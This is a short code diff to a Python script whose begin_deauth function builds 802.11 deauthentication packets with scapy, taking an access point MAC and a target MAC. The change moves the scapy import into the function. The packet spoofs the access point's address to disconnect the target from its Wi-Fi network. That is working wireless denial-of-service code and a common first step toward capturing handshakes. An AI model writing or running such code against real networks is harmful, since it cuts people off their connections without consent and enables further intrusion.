@@ -1,6 +1,5 @@
 import threading
 import time
-import scapy.all
 from collections import deque
 
 _STATUS_LINES = deque(maxlen=120)
@@ -44,8 +43,10 @@ def begin_deauth(ap_mac, target_mac, interface):
             _push_status(f"iface={interface}")
             _push_status(f"...starting engine...")
             
-
-            # Build deauth packet            
+            # Import scapy modules inside the function to avoid circular imports
+            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+            # Build deauth packet
+            
             _push_status(f"building deauth packet")
             pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
             
